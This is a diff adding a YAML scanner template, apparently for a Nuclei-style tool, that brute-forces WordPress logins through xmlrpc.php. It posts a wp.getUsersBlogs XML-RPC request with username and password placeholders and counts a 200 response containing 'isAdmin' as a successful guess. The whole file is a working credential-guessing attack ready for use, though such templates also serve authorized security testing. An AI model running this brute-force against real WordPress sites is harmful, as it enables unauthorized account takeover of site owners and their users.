@@ -1,0 +1,42 @@
+id: wordpress-xmlrpc-brute-force
+brief:
+    title: Wordpress XMLRPC.php username and password Bruteforcer
+    by: Exid
+    level: high
+    about: This template bruteforces username and passwords through xmlrpc.php being available.
+    label:
+        - wordpress
+        - php
+        - xmlrpc
+        - fuzz
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/xmlrpc.php'
+      head:
+        Content-Length: "235"
+      body: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+         <methodCall>
+           <methodName>wp.getUsersBlogs</methodName>
+           <params>
+             <param>
+               <value>{{username}}</value>
+             </param>
+               <param>
+             <value>{{password}}</value>
+               </param>
+           </params>
+         </methodCall>
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - url
+            - xmlrpc
+            - isAdmin
+          in: body
+          need: all
